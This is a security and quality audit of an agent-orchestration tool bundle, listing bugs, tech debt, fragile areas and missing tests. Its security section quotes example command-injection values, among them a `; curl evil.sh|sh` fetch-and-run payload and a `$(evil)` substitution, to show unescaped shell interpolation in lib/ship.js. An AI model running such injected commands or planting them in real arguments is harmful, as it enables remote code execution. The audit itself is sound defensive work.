# Codebase Concerns

**Analysis Date:** 2026-08-22

## Tech Debt

**`--force` replan gate references a parameter that doesn't exist:**
- Issue: `lib/plan.js` (line 50) throws `"replanning is blocked without --force"` when a phase already passed verification, but the `gsd_plan` tool schema (lines 23-32) defines no `force` parameter. Replanning a verified phase is therefore impossible without manually deleting `VERIFICATION.md`.
- Files: `lib/plan.js`
- Impact: Misleading error message; the only "escape hatch" the tool advertises is unreachable; verified-then-needs-fix phases require manual filesystem surgery.
- Fix approach: Add a `force` boolean parameter to `gsd_plan` and thread it into the gate condition, or reword the error to state the actual remedy.

**`total_plans` progress counter is never updated:**
- Issue: `gsd_status` and `gsd_progress` report `completed_plans/total_plans` from `STATE.md` frontmatter, but nothing ever sets `progress.total_plans` after `gsd_init` seeds it to `0` (`lib/state.js` line 102). Only `completed_plans` is incremented in `markPlanSummary` (`lib/state.js` line 415). Progress always renders `X/0 plans`.
- Files: `lib/state.js`, `lib/core-tools.js`
- Impact: Progress reporting for plans is permanently wrong; `percent` in `completePhase` is computed only from phases, so plan-level progress cannot be trusted.
- Fix approach: In `markPlanSummary` (or `planIndex`), sync `progress.total_plans` to the phase's current plan count.

**Dead code: `_ensureDir` is a no-op**
- Issue: `lib/state.js` (lines 61-66) defines `_ensureDir` that only calls `stat` and swallows absence — it never creates anything, and it is never called. The intent (ensuring `.planning/phases/<NN>-<slug>/` exists before artifact writes) is unfulfilled.
- Files: `lib/state.js`
- Impact: Whether `writeArtifact` succeeds depends entirely on the host `fs` service auto-creating parent directories — an unverified assumption (see Fragile Areas).
- Fix approach: Either implement real `mkdir` semantics or delete the method and document the host `fs` contract.

**`_planning()` private method reached across module boundary**
- Issue: `lib/quick.js` line 40 calls `s._planning(cwd)` on the `gsdState` service instance — a method prefixed as private internals, breaking the service's encapsulation.
- Files: `lib/quick.js`
- Impact: A rename/refactor of `GsdState` internals silently breaks `gsd_quick`; there is no stable public API for the quick-task directory path.
- Fix: Export the path helper or compute the path from a public accessor.

**Stray `progress.total_phases: undefined` patch in `gsd_new_milestone`**
- Issue: `lib/core-tools.js` line 195 passes `"progress.total_phases": undefined` to `updateStateFrontmatter`, which `Object.assign`s it onto `frontmatter` as a literal dotted key; `stringifyFrontmatter` (`lib/_shared.js` line 92-94) then emits `progress.total_phases: null` as a top-level frontmatter line in `STATE.md`.
- Files: `lib/core-tools.js`, `lib/_shared.js`
- Impact: Cosmetic pollution of `STATE.md` frontmatter each time a milestone is started.
- Fix: Delete the nested key explicitly (`delete doc.frontmatter.progress.total_phases`) instead of assigning `undefined` through a dotted key.

## Known Bugs

**`--gaps-only` filter can never match**
- Issue: `lib/execute.js` line 53 filters with `p.gap_closure === "true"`. The frontmatter value is parsed by `coerceScalar` (`lib/_shared.js` line 35-37), so an unquoted YAML `gap_closure: true` becomes a boolean, and `true === "true"` is false — the filter matches nothing. Additionally, the `PLANNER_PROMPT` (`lib/_agents.js` line 48-68) never instructs the planner to write a `gap_closure` field at all, so fix plans produced in gap-closure mode will not be marked.
- Files: `lib/execute.js`, `lib/_agents.js`
- Trigger: `gsd_execute` with `gapsOnly=true` after a `gsd_plan --gaps` run.
- Impact: The verify-gaps loop (`gsd_verify` → `gsd_plan --gaps` → `gsd_execute --gaps-only`) silently executes nothing and reports the phase partially executed.
- Workaround: Run `gsd_execute` without `--gaps-only`; this re-runs only plans lacking SUMMARY, which happens to include the fix plans.
- Fix approach: Coerce with `String(p.gap_closure) === "true"` and add the `gap_closure: true` field to the planner's frontmatter spec in `PLANNER_PROMPT`.

**Closed-phase gate is not re-openable (see also `--force` debt above):**
- Same root cause; listed as bug because the flow the tool itself recommends (`gsd_verify` routing "replanning is blocked without --force", `lib/verify.js` line 88) cannot be followed.
- Fix approach: Add `force` param to `gsd_plan` and honor it in the gate at `lib/plan.js` line 50.

**`gsd_new_milestone` progress counter desync**
- Issue: after appending phases, `lib/core-tools.js` lines 198-200 recompute `total_phases`, but `completed_phases`/`percent` are not recomputed, so a project that has completed phases shows a percentage calculated from the new phase count while the completed count is stale.
- Files: `lib/core-tools.js`
- Trigger: `gsd_new_milestone` on a project with completed phases.

## Security Considerations

**Shell command injection in `lib/ship.js`**
- Risk: `git`/`gh` run through `execSync` with string interpolation. Three data-controlled values reach `/bin/sh` unescaped:
  1. `args.base` (free-form tool parameter) is interpolated into `gh pr create --base ${defaultBranch}` (line 126). A model- or user-supplied `base` value like `--base x; curl evil.sh|sh` executes.
  2. `branch` (output of `git rev-parse --abbrev-ref HEAD`, line 63) is interpolated into `git push -u origin ${branch}` (line 75). Git permits `$`, `(`, `)`, and backticks in branch names (via `git check-ref-format`), so a crafted branch name yields command execution.
  3. `title` built from `phase.name` (`ROADMAP.md` content, which is model-generated) is shell-quoted only via `JSON.stringify` (line 126) — double quotes are escaped but backticks and `$()` are not, so `--title "Phase 1: $(evil)"` executes.
- Files: `lib/ship.js` (lines 19-27, 63-75, 119-130)
- Current mitigation: none beyond `JSON.stringify` on the title, which is ineffective for backticks/`$()`.
- Recommendations: Replace `execSync` with `child_process.spawn` and pass arguments as arrays (`spawn("git", ["push", "-u", "origin", branch])`), never a joined string. Validate `args.base` against `/^[A-Za-z0-9._\/-]+$/`.

**Unvalidated workspace paths**
- Risk: `lib/state.js` builds every path by string concatenation of `cwd` + `.planning/...`; `cwd` comes from the session header (`exec.agent.session.header.cwd`) or falls back to `process.cwd()`. A session pinned to an attacker-controlled directory is not the concern; rather, there is no path containment check — a session `cwd` outside the intended project writes `.planning/` wherever the session points.
- Files: `lib/_runner.js` (line 49), all phase tools using `cwdOf`.
- Recommendation: Acceptable for single-user dev tooling; document that the bundle follows the session cwd and never asserts it is inside a git repo root.

## Performance Bottlenecks

**`execSync` blocks the host Node event loop**
- Problem: every git/gh call in `lib/ship.js` (`git`, `gitOk`, `gh` at lines 19-27) uses `execSync`, which blocks the entire DSH host process (all sessions) until the child exits. `git push` to a slow remote can stall every other session's tool loop.
- Files: `lib/ship.js`
- Improvement path: use `node:child_process.spawn`/`execFile` (promisified) so pushes and status checks run async.

**O(phases × plans) artifact reads per orientation call**
- Problem: `gsd_progress` (`lib/core-tools.js` line 134) calls `planIndex` per phase, and `planIndex` (`lib/state.js` line 392) reads every PLAN.md and stats every SUMMARY for each phase — file IO on every call. `gsd_status` reads STATE.md + ROADMAP.md each time. Fine at opengsd scale (≤10s of phases) but degrades linearly with project size.
- Files: `lib/core-tools.js`, `lib/state.js`
- Improvement path: short-lived memoization keyed on cwd + file mtime, or cache `planIndex` results with an invalidation on artifact write.

**Parallel executors contend on the shared git index**
- Problem: same-wave executors run concurrently (`Promise.all` in `lib/execute.js` line 102) on the single working tree; each runs `git add`/`git commit` (via the EXECUTOR_PROMPT's atomic-commit discipline), racing on `.git/index.lock`. The plan-checker's non-overlap guarantee covers files, not git's lock.
- Files: `lib/execute.js` (lines 79-112), `lib/_agents.js` (EXECUTOR_PROMPT)
- Impact: intermittent "index.lock exists" executor failures in wave > 1; the orchestrator only detects "no SUMMARY.md written" afterwards.
- Mitigation path: serialize commits with a simple in-module mutex around executor dispatch, or move to worktrees (acknowledged in `lib/execute.js` header comment as a deliberate deviation).

## Fragile Areas

**The artifact write path has never been exercised against a live host**
- Files: `lib/state.js` (`_write`/`writeArtifact` lines 56-59, 326-334), `lib/core-tools.js` (`gsd_init`), `README.md` line 110 ("A full live mount ... is the next step").
- Why fragile: every artifact write flows through `ctx.fs.writeText` (`lib/state.js` line 57). Whether the host `fs` service auto-creates parent directories (e.g. `.planning/phases/01-foo/`) is unverified — `_ensureDir` was meant to handle it but is a no-op. `gsd_quick` works around this by using `node:fs/promises` + `mkdir recursive` (`lib/quick.js` line 56) while `state.js` does not — inconsistent evidence about host behavior. If the host fs requires existing parents, `gsd_init`, `gsd_discuss`, and every `writeArtifact` call fails on first use.
- Safe modification: fix `_ensureDir` to actually create the parent dirs through the host `fs` service (or `node:fs` as in quick.js), and exercise `gsd_init → gsd_discuss → gsd_plan` in a live session before relying on the loop.
- Test coverage: none (no tests at all).

**Subagent writes vs orchestrator writes race (RESEARCH.md)**
- Files: `lib/plan.js` lines 69-83, `lib/_agents.js` RESEARCHER_PROMPT.
- Why fragile: the researcher prompt says "Write the file with the Write tool" (`lib/_agents.js` line 31) AND the orchestrator saves the returned output as `RESEARCH.md` ("Write your RESEARCH.md output as the FULL file contents", `lib/plan.js` line 77). If the subagent follows its own prompt and writes the file directly while returning the instructed "one-paragraph summary", the orchestrator overwrites the real research with the summary. Behavior depends on an unobservable model choice.
- Safe modification: pick one owner — either subagent writes the file and the orchestrator only reads back, or the orchestrator writes and the prompt says "return the full contents; do NOT write the file".
- Same pattern in `lib/ui.js` line 47.

**Planner's plan-file writes are unverified**
- Files: `lib/plan.js` (lines 108-116).
- Risk: the planner subagent is told to write PLAN.md files directly with its own Write tool ("Write each plan to ... with the Write tool", `lib/plan.js` line 106); the orchestrator then reads them back via `listPlans`. If the in-process `spawn` provider's subagent writes to a different sandbox/cwd than the orchestrator, `listPlans` returns empty and `gsd_plan` reports "planner produced no PLAN.md files" with no retry. This path has never been exercised live.
- Test coverage: none.

**EXECUTOR_PROMPT protected-ref discipline contradicts the shared-tree flow**
- Files: `lib/_agents.js` lines 134-139 (EXECUTOR_PROMPT worktree discipline), `lib/execute.js` line 97 ("Work in the current workspace").
- The executor prompt unconditionally commands: "Pre-commit HEAD assertion: refuse to commit onto protected refs (main|master|develop|trunk|release/*). Only commit on agent-*/worktree-* branches." But this bundle runs executors on the shared working tree with no worktree/branch creation (`README.md` line 88, `lib/execute.js` header). On a repository where the default branch is `main` (the normal case), an obedient executor refuses every commit, and `gsd_execute`'s only success criterion is "SUMMARY.md exists" — the phase never completes.
- This is a behavioral contradiction shipped in the meta-prompt, not a code error; it will manifest only on live execution.
- Fix approach: make the discipline conditional on actual worktree use (the prompt itself already says "when run in an isolated git worktree"), or have `gsd_execute` create a `gsd-phase-<NN>` branch per phase before dispatching.

**`planningContext` silently truncates at 60k chars**
- Files: `lib/_runner.js` lines 36-46.
- Any artifact above 60k chars is truncated with a marker. A plan-checker or verifier then passes/fails on incomplete inputs. The 200k context window claim (`README.md` line 9, config `context_window: 200000`) implies headroom that a fixed per-file cap doesn't budget.
- Safe modification: only truncate when the total exceeds a budget (sum across entries), and log the truncation in the tool output.

## Scaling Limits

**Phase numbering across milestones**
- Current capacity: phase numbers are 0-padded to 2 digits (`zeroPad`, `lib/_shared.js`). Phase 100+ renders as "100" (3 digits) — parsing still works (`/^\d+$/`), but the artefact names and regexes in `listPlans` (`lib/state.js` line 360) keep working. The real limit is the two-digit padding convention in `-PLAN.md`/`-SUMMARY.md` suffixes: plan 10+ renders as "10", which collides with... none (zeroPad of 10 = "10") — but plan 5 = "05" vs plan 5 zeroPad — fine. No collision, but the 2-digit prefix convention in the README's `.planning/` layout ("<NN> = zero-padded phase number") silently becomes inconsistent at 100 phases.
- Current capacity: <100 phases, <100 plans/phase before naming drift; no architectural blocker.
- Scaling path: document the limit; convert to unpadded numeric naming if needed.

- **Single-project orientation**: all state is keyed by cwd (`_cache` Map keyed on cwd, `lib/state.js` line 37). One project per session cwd; multi-repo work requires per-cwd state, which is supported, but the persona's sync cache renders only the session's cwd — no cross-repo view. Not a blocker at v0.1.

## Dependencies at Risk

**Peer dependencies pinned to `*` and an undeclared import**
- Risk: `package.json` peerDependencies are all `*` (`@deepseek-ai/dsh-tools`, `@deepseek-ai/schemastery`, `@deepseek-ai/cordis`), while `lib/commands.js` imports `@deepseek-ai/dsh-llm` (line 14) which is **not** listed anywhere. `dependencies: {}` means the bundle fully relies on host hoisting.
- Impact: any breaking host API change (`ctx.tools.register`, `ctx.commands.register`, `agent.followup`, `ctx.fs`) breaks the bundle without a version constraint or dependency declaration to flag it. The `@deepseek-ai/dsh-llm` import fails outright if the host doesn't provide it.
- Migration plan: declare all host modules actually imported (`@deepseek-ai/dsh-llm`) in peerDependencies, and set minimum-version peers (e.g. `"@deepseek-ai/dsh-tools": ">=0.x"`) rather than `*`.

## Missing Critical Features

**No automated validation / CI for the bundle itself**
- Problem: `README.md` line 110 is the only "validation" — a manual claim that modules load and register tools. There is no test file, no test runner, no lint config, no CI in the repo (no lockfile, no `.git` even).
- Blocks: regressions in the phase loop (artifact naming, state transitions, frontmatter round-trips in `lib/_shared.js`) are undetectable; the "live mount" step is the first real execution anyone will get.

**No capability gates (acknowledged in README)**
- Ship does only the core preflight (verification passed, clean tree, branch, remote, `gh`). Security/audit gates (`ship:pre`, TDD-audit, broken-windows ledger), the async-jobs manifest, `WINDOWS.md`, and the UAT conversational loop are not implemented. `gsd_ship` will happily create a PR for a phase with no tests if `gsd_verify` returned `passed` via a verifier that skipped behavior checks (the verifier is a subagent; nothing in code enforces score thresholds — `lib/verify.js` routes purely on the frontmatter `status` string written by the subagent, with no score floor check).

**No score/behavior gate in verify**
- `lib/verify.js` lines 81-91: the tool trusts the verifier subagent's `status:` frontmatter verbatim; a low `score` (e.g. 1/9) still routes to `ship`. The only "score" surface is display.

## Test Coverage Gaps

**Not covered by any test:**
- All of `lib/state.js` — frontmatter round-trips, ROADMAP parse/serialize, progress counters, phase/plan naming, artifact paths.
- All of `lib/_shared.js` — `parseFrontmatter`/`stringifyFrontmatter` quoting, `parseRoadmap` table parsing, requirement REQ-ID matching (the regex at `lib/_shared.js` line 180 is the sole gate for what counts as a requirement).
- `lib/commands.js` — command argument parsing (`--wave`, `--gaps-only`, `--draft`).
- `lib/ship.js` — preflight gate ordering, PR body assembly, shell-argument escaping.
- Artifact write path — never exercised against the host `fs` service.
- Priority: High — the frontmatter/roadmap parsers and the `--gaps-only` filter are the most likely sources of silent wrong behavior.

---

*Concerns audit: 2026-08-22*
